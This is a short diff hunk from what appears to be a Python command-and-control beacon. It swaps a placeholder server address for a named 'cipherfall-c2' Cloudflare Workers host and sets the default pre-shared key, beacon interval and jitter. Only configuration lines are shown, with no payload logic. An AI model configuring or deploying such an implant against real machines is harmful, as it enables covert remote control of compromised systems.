@@ -55,7 +55,7 @@ Limitations:
 import base64, hashlib, hmac as _hmac, json, os, platform
 import random, ssl, struct, subprocess, sys, time, urllib.error, urllib.request
 
-WORKER_URL = os.environ.get("WORKER_URL", "https://your-worker.workers.dev").rstrip("/")
+WORKER_URL = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
 PSK        = os.environ.get("C2_PSK",     "changeme")
 BEACON_INT = int(os.environ.get("C2_INT",    "30"))
 JITTER     = int(os.environ.get("C2_JITTER", "10"))
